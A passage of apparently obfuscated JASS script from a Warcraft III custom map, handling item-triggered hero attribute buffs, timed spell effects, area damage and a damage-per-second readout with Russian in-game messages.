local effect Vn=LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),3)
call DestroyEffect(Vn)
if Vm==2 then
call SetHeroAgi(Hu,GetHeroAgi(Hu,false)-Vl,false)
set Nd[GetPlayerId(GetOwningPlayer(Hu))+1]=Nd[GetPlayerId(GetOwningPlayer(Hu))+1]-1
set UH[GetPlayerId(GetOwningPlayer(Hu))+1]=UH[GetPlayerId(GetOwningPlayer(Hu))+1]-100
elseif Vm==3 then
call SetHeroInt(Hu,GetHeroInt(Hu,false)-Vl,false)
set N0[GetPlayerId(GetOwningPlayer(Hu))+1]=N0[GetPlayerId(GetOwningPlayer(Hu))+1]-1
set UI[GetPlayerId(GetOwningPlayer(Hu))+1]=UI[GetPlayerId(GetOwningPlayer(Hu))+1]-100
elseif Vm==1 then
call SetHeroStr(Hu,GetHeroStr(Hu,false)-Vl,false)
set Ng[GetPlayerId(GetOwningPlayer(Hu))+1]=Ng[GetPlayerId(GetOwningPlayer(Hu))+1]-1
set UG[GetPlayerId(GetOwningPlayer(Hu))+1]=UG[GetPlayerId(GetOwningPlayer(Hu))+1]-100
elseif Vm==4 then
call SetHeroInt(Hu,GetHeroInt(Hu,false)-Vl,false)
set TQ[GetPlayerId(GetOwningPlayer(Hu))+1]=TQ[GetPlayerId(GetOwningPlayer(Hu))+1]-1
set UJ[GetPlayerId(GetOwningPlayer(Hu))+1]=UJ[GetPlayerId(GetOwningPlayer(Hu))+1]-100
elseif Vm==5 then
call SetHeroStr(Hu,GetHeroStr(Hu,false)-Vl,false)
set Nf[GetPlayerId(GetOwningPlayer(Hu))+1]=Nf[GetPlayerId(GetOwningPlayer(Hu))+1]-1
set UK[GetPlayerId(GetOwningPlayer(Hu))+1]=UK[GetPlayerId(GetOwningPlayer(Hu))+1]-100
endif
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Vn=null
set Hu=null
endfunction
function oU takes nothing returns nothing
local unit PK=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local effect Vk=LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),1)
call UnitRemoveAbility(PK,$41314243)
call UnitRemoveAbility(PK,$41314244)
call UnitRemoveAbility(PK,$41314245)
call DestroyEffect(Vk)
set Vk=null
call FlushChildHashtable(PP,GetHandleId(GetExpiredTimer()))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set PK=null
endfunction
function oV takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local item MO=GetManipulatedItem()
local timer Hc
local integer Vl
local integer Vm
local integer Mc
local effect No
if GetUnitAbilityLevel(Hu,$41304233)==0 then
if GetItemTypeId(MO)==$49303557 then
call UnitAddAbility(Hu,$41314243)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314243,false)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,10,true,function oU)
elseif GetItemTypeId(MO)==$49303634 then
call UnitAddAbility(Hu,$41314244)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314244,false)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,10,true,function oU)
elseif GetItemTypeId(MO)==$49303645 then
call UnitAddAbility(Hu,$41314245)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41314245,false)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,10,true,function oU)
elseif GetItemTypeId(MO)==$49304154 then
call UnitAddAbility(Hu,$4131424B)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),10,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,6)
call TimerStart(Hc,1,true,function oS)
elseif GetItemTypeId(MO)==$49304336 then
call UnitAddAbility(Hu,$4131424B)
call SetUnitAbilityLevel(Hu,$4131424B,2)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),10,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,6)
call TimerStart(Hc,1,true,function oS)
elseif GetItemTypeId(MO)==$49304156 or GetItemTypeId(MO)==$49304437 then
call UnitAddAbility(Hu,$41313757)
set Mc=500+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/10
call nj(Hu,Mc)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Mc)
call TimerStart(Hc,8,true,function nE)
elseif GetItemTypeId(MO)==$49304339 or GetItemTypeId(MO)==$49304438 then
call UnitAddAbility(Hu,$41313757)
call SetUnitAbilityLevel(Hu,$41313757,2)
set Mc=800+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/10
call nj(Hu,Mc)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Mc)
call TimerStart(Hc,8,true,function nE)
elseif GetItemTypeId(MO)==$4930594F or GetItemTypeId(MO)==$49305A56 then
set Vl=GetHeroAgi(Hu,true)/5
call SetHeroAgi(Hu,GetHeroAgi(Hu,false)+Vl,false)
set Nd[GetPlayerId(GetOwningPlayer(Hu))+1]=Nd[GetPlayerId(GetOwningPlayer(Hu))+1]+1
set UH[GetPlayerId(GetOwningPlayer(Hu))+1]=UH[GetPlayerId(GetOwningPlayer(Hu))+1]+100
set Vm=2
set No=AddSpecialEffectTarget("war3mapImported\\Blood Ritual.mdx",Hu,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,Vl)
call SaveInteger(PP,GetHandleId(Hc),2,Vm)
call SaveEffectHandle(PP,GetHandleId(Hc),3,No)
call TimerStart(Hc,10,false,function oT)
set No=null
elseif GetItemTypeId(MO)==$49313030 then
set Vl=GetHeroInt(Hu,true)/5
call SetHeroInt(Hu,GetHeroInt(Hu,false)+Vl,false)
set N0[GetPlayerId(GetOwningPlayer(Hu))+1]=N0[GetPlayerId(GetOwningPlayer(Hu))+1]+1
set UI[GetPlayerId(GetOwningPlayer(Hu))+1]=UI[GetPlayerId(GetOwningPlayer(Hu))+1]+100
set Vm=3
set No=AddSpecialEffectTarget("war3mapImported\\Blood Ritual.mdx",Hu,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,Vl)
call SaveInteger(PP,GetHandleId(Hc),2,Vm)
call SaveEffectHandle(PP,GetHandleId(Hc),3,No)
call TimerStart(Hc,10,false,function oT)
set No=null
elseif GetItemTypeId(MO)==$49305951 then
set Vl=GetHeroStr(Hu,true)/5
call SetHeroStr(Hu,GetHeroStr(Hu,false)+Vl,false)
set Ng[GetPlayerId(GetOwningPlayer(Hu))+1]=Ng[GetPlayerId(GetOwningPlayer(Hu))+1]+1
set UG[GetPlayerId(GetOwningPlayer(Hu))+1]=UG[GetPlayerId(GetOwningPlayer(Hu))+1]+100
set Vm=1
set No=AddSpecialEffectTarget("war3mapImported\\Blood Ritual.mdx",Hu,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,Vl)
call SaveInteger(PP,GetHandleId(Hc),2,Vm)
call SaveEffectHandle(PP,GetHandleId(Hc),3,No)
call TimerStart(Hc,10,false,function oT)
set No=null
elseif GetItemTypeId(MO)==$49305A59 then
set Vl=GetHeroInt(Hu,true)/5
call SetHeroInt(Hu,GetHeroInt(Hu,false)+Vl,false)
set TQ[GetPlayerId(GetOwningPlayer(Hu))+1]=TQ[GetPlayerId(GetOwningPlayer(Hu))+1]+1
set UJ[GetPlayerId(GetOwningPlayer(Hu))+1]=UJ[GetPlayerId(GetOwningPlayer(Hu))+1]+100
set Vm=4
set No=AddSpecialEffectTarget("war3mapImported\\Blood Ritual.mdx",Hu,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,Vl)
call SaveInteger(PP,GetHandleId(Hc),2,Vm)
call SaveEffectHandle(PP,GetHandleId(Hc),3,No)
call TimerStart(Hc,10,false,function oT)
set No=null
elseif GetItemTypeId(MO)==$49313031 or GetItemTypeId(MO)==$49305953 then
set Vl=GetHeroStr(Hu,true)/5
call SetHeroStr(Hu,GetHeroStr(Hu,false)+Vl,false)
set Nf[GetPlayerId(GetOwningPlayer(Hu))+1]=Nf[GetPlayerId(GetOwningPlayer(Hu))+1]+1
set UK[GetPlayerId(GetOwningPlayer(Hu))+1]=UK[GetPlayerId(GetOwningPlayer(Hu))+1]+100
set Vm=5
set No=AddSpecialEffectTarget("war3mapImported\\Blood Ritual.mdx",Hu,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),1,Vl)
call SaveInteger(PP,GetHandleId(Hc),2,Vm)
call SaveEffectHandle(PP,GetHandleId(Hc),3,No)
call TimerStart(Hc,10,false,function oT)
set No=null
elseif GetItemTypeId(MO)==$49304430 or GetItemTypeId(MO)==$4930444E then
set Mc=500+GetHeroAgi(Hu,true)/2
call nj(Hu,Mc)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Mc)
call TimerStart(Hc,6,true,function nE)
elseif GetItemTypeId(MO)==$49304535 or GetItemTypeId(MO)==$49304637 then
set Mc=1000+GetHeroAgi(Hu,true)/2+GetHeroAgi(Hu,true)/4
call nj(Hu,Mc)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Mc)
call TimerStart(Hc,6,true,function nE)
elseif GetItemTypeId(MO)==$49304650 or GetItemTypeId(MO)==$49304745 then
set Mc=1500+GetHeroAgi(Hu,true)
call nj(Hu,Mc)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Mc)
call TimerStart(Hc,6,true,function nE)
elseif GetItemTypeId(MO)==$70686C74 and GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41305639)==0 then
call UnitAddAbility(MT[GetPlayerId(GetOwningPlayer(Hu))],$41305639)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305639,false)
set Mc=GetPlayerId(GetOwningPlayer(Hu))+1
set Ng[Mc]=Ng[Mc]+.07
set UG[Mc]=UG[Mc]+7
set Nf[Mc]=Nf[Mc]+.07
set UK[Mc]=UK[Mc]+7
set Nd[Mc]=Nd[Mc]+.07
set UH[Mc]=UH[Mc]+7
set N0[Mc]=N0[Mc]+.07
set UI[Mc]=UI[Mc]+7
set TQ[Mc]=TQ[Mc]+.07
set UJ[Mc]=UJ[Mc]+7
set UM[Mc]=UM[Mc]+7
elseif GetItemTypeId(MO)==$49304C41 or GetItemTypeId(MO)==$49305534 then
call SetItemDroppable(MO,false)
set Hc=CreateTimer()
call SaveItemHandle(PP,GetHandleId(Hc),10,MO)
call TimerStart(Hc,100,false,function oQ)
elseif GetItemTypeId(MO)==$73687273 and RectContainsUnit(Gu,GetTriggerUnit()) then
call SetUnitAbilityLevel(LC,$41666165,2)
call SetUnitAbilityLevel(LC,$41436376,2)
call SetUnitAbilityLevel(LC,$4143626E,2)
call nk(LC,$2625A0)
call nj(LC,8000)
call nl(LC,320)
call nh(LC,"|c00ff9696Да начнётся веселье!",.028,255,255,255)
endif
endif
set Hu=null
set MO=null
set Hc=null
endfunction
function oW takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddAction(Hc,function oV)
set Hc=null
endfunction
function oX takes nothing returns nothing
local unit Mc
local unit No
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)<9 then
set Mc=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
set No=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call UnitDamageTarget(Mc,No,I2R(GetHeroAgi(Mc,true)/2*LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Mc=null
set No=null
else
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1),$41305933)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function oY takes nothing returns nothing
local unit Mc
local location No
local group Np
local boolexpr Nt
local string Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)<6 then
set Mc=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
set No=GetUnitLoc(Mc)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),400,Nt)
set Ny=""
if GetOwningPlayer(Mc)==GetLocalPlayer() then
set Ny="war3mapImported\\Vortex.MDX"
endif
call DestroyEffect(AddSpecialEffectLoc(Ny,No))
set Nu=GetHeroInt(MT[GetPlayerId(GetOwningPlayer(Mc))],true)*LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)
set Pq=Mc
call ForGroup(Np,function nB)
call DestroyBoolExpr(Nt)
call DestroyGroup(Np)
call RemoveLocation(No)
set No=null
set Nt=null
set Np=null
set Mc=null
else
call RemoveUnit(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function oZ takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
if GetUnitState(Hu,UNIT_STATE_LIFE)>GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.04 then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)-GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.04)
endif
else
call UnitRemoveAbility(Hu,$41304837)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function oa takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),150,Np)
set Nu=(GetHeroInt(Hu,true)+GetHeroStr(Hu,true)+GetHeroAgi(Hu,true))*2
set Pq=Hu
call ForGroup(No,function nB)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function ob takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2),$41305442)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function oc takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local group Mc
local location No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=CreateGroup()
set No=GetUnitLoc(NQ)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),300,Np)
set Pq=Hu
set Nu=(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/4
call ForGroup(Mc,function nB)
call nd(Mc,$5330305A,3,"cripple")
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set NQ=null
set Hu=null
endfunction
function od takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local group Mc
local location No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=CreateGroup()
set No=GetUnitLoc(NQ)
set Np=Condition(function mw)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),500,Np)
set Nu=GetHeroInt(Hu,true)
call ForGroup(Mc,function m4)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function oe takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local group Mc
local location No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=CreateGroup()
set No=GetUnitLoc(NQ)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),500,Np)
set Pq=Hu
set Nu=GetHeroInt(Hu,true)*3/2
call ForGroup(Mc,function nB)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set NQ=null
set Hu=null
endfunction
function of takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit MB=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),1)
local integer Mc
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),2,LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=GetHeroInt(MT[GetPlayerId(GetOwningPlayer(Hu))],true)
call m2(MB,Mc)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Undead\\RaiseSkeletonWarrior\\RaiseSkeleton.mdl",MB,"origin"))
else
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set MB=null
set Hu=null
endfunction
function og takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local unit MB=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),1)
local integer L9
if nO(Hu,$49304152)==true then
set L9=GetHeroInt(Hu,true)
elseif nO(Hu,$49304342)==true then
set L9=GetHeroInt(Hu,true)*3/2
endif
if IsUnitAlly(MB,GetOwningPlayer(Hu))==true then
call m2(MB,L9)
else
call mz(Hu,MB,L9)
endif
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),2,LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)==0 then
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set MB=null
endfunction
function oh takes nothing returns nothing
local unit Hu=MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))]
local unit Nv=GetEnumUnit()
local integer L9=GetHeroStr(Hu,true)/3
local timer Hc
call nj(Nv,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("Abilities\\Spells\\NightElf\\BattleRoar\\RoarTarget.mdl",Hu,"overhead"))
call TimerStart(Hc,7,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function oi takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local integer L9=1000+GetHeroInt(Hu,true)/3
local integer Pd=150+GetHeroInt(Hu,true)/17
local timer Hc
call nj(Nv,L9)
call nl(Nv,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,35,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function oj takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local integer L9=500+GetHeroInt(Hu,true)/4
local integer Pd=100+GetHeroInt(Hu,true)/17
local timer Hc
call nj(Nv,L9)
call nl(Nv,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,35,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function ok takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local integer L9=300+GetHeroInt(Hu,true)/5
local integer Pd=50+GetHeroInt(Hu,true)/20
local timer Hc
call nj(Nv,L9)
call nl(Nv,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,35,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function ol takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local integer L9=1000+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)+GetHeroAgi(Hu,true))/4
local integer Pd=100+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)+GetHeroAgi(Hu,true))/10
local timer Hc
call nj(Nv,L9)
call nl(Nv,Pd)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,15,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function om takes nothing returns nothing
local unit Hu=GetEnumUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ffff00Время боя|r: "+I2S(NZ)+"сек.")
call DisplayTextToPlayer(Player(Ma),0,0,"|c00ff9696Средний ДПС|r: "+I2S(R2I(GetUnitState(K7,UNIT_STATE_MAX_LIFE)-GetUnitState(K7,UNIT_STATE_LIFE))/NZ)+" урона/сек.")
set Hu=null
endfunction
function on takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit MB=GetSpellTargetUnit()
local real NT
local unit NQ
local timer Hc
local integer Ma
local group Mc
local location No
local boolexpr Np
local integer Nt
local string Ny
local integer Ot
local location Ou
local real Ov
if GetUnitAbilityLevel(Hu,$41304233)==0 then
if GetSpellAbilityId()==$4131424C then
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(PP,GetHandleId(Hc),1,MB)
call SaveInteger(PP,GetHandleId(Hc),2,10)
call TimerStart(Hc,1,true,function og)
elseif GetSpellAbilityId()==$41304438 then
set NT=I2R(GetUnitAbilityLevel(Hu,$41304438)*400+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/2)
call UnitDamageTarget(Hu,MB,NT,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+NT)
elseif GetSpellAbilityId()==$41304549 then
set NT=I2R((GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/3)
call SetUnitState(MB,UNIT_STATE_LIFE,GetUnitState(MB,UNIT_STATE_LIFE)+NT)
elseif GetSpellAbilityId()==$41304557 then
set NT=I2R(GetUnitAbilityLevel(Hu,$41304557)*400+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/2)
call UnitDamageTarget(Hu,MB,NT,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$53303039 then
set NT=I2R(GetUnitAbilityLevel(Hu,$53303039)*400+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/2)
call UnitDamageTarget(Hu,MB,NT,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$41304C35 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),600,Np)
call ForGroup(Mc,function ol)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41304D37 then
set NQ=CreateUnit(GetOwningPlayer(Hu),$68303348,GetUnitX(Hu),GetUnitY(Hu),0)
call nD(NQ,15)
set Nt=GetUnitAbilityLevel(Hu,$41304D37)*200+(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true)/2)
call nj(NQ,Nt)
elseif GetSpellAbilityId()==$41304D38 then
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(PP,GetHandleId(Hc),1,MB)
call SaveInteger(PP,GetHandleId(Hc),2,6)
call TimerStart(Hc,1,true,function of)
elseif GetSpellAbilityId()==$41304E43 then
set No=GetSpellTargetLoc()
